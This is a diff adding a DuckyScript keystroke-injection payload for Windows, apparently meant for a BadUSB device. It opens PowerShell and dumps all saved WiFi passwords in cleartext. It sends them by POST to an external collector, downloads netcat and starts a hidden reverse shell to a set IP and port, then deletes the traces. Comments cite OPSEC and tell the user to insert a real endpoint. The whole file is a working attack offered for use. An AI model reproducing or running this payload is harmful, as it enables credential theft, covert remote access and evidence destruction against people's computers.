@@ -1,0 +1,33 @@
+REM Initial delay for system readiness
+DELAY 3000
+REM Open Run dialog (Win + R)
+GUI r
+DELAY 3000
+REM Start PowerShell (hidden window)
+STRING powershell
+ENTER
+DELAY 3000
+REM Extract and save all WiFi passwords to a temp file (OPSEC: use temp location)
+STRING (netsh wlan show profiles) | Select-String "Perfil" | ForEach-Object { $profile = $_.ToString().Split(":")[1].Trim(); netsh wlan show profile name="$profile" key=clear } > $env:TEMP\wifi_passwords.txt
+ENTER
+DELAY 6000
+REM Exfiltrate WiFi passwords to server (change URL to your real endpoint)
+STRING Invoke-WebRequest -Uri "http://c3g2je38vyn2rzg7kaheupbf369xxnlc.oastify.com/capture" -Method POST -InFile "$env:TEMP\wifi_passwords.txt" -ContentType "text/plain"
+ENTER
+DELAY 5000
+REM Download reverse shell payload to temp location
+STRING Invoke-WebRequest -Uri "http://192.168.1.27:4444/nc64.exe" -OutFile "$env:TEMP\nc64.exe"
+ENTER
+DELAY 5000
+REM Execute reverse shell payload (change IP and port accordingly)
+STRING Start-Process "$env:TEMP\nc64.exe" -ArgumentList '-e cmd.exe 192.168.1.27 5555' -WindowStyle Hidden
+ENTER
+DELAY 4000
+REM Remove evidence: delete credentials file and payload
+STRING Remove-Item "$env:TEMP\wifi_passwords.txt","$env:TEMP\nc64.exe" -Force
+ENTER
+DELAY 2000
+REM Exit PowerShell session
+STRING exit
+ENTER
+DELAY 2700
